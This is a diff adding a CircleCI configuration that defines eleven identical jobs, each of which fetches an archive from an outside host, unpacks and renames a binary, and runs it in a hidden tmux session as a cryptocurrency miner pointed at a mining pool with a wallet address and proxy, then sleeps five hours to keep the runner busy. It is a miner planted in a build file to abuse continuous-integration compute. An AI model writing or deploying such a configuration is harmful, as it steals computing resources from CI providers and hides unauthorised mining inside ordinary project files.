@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  trignje:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  trignje10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - trignje
+      - trignje1
+      - trignje2
+      - trignje3
+      - trignje4
+      - trignje5
+      - trignje6
+      - trignje7
+      - trignje8
+      - trignje9
+      - trignje10
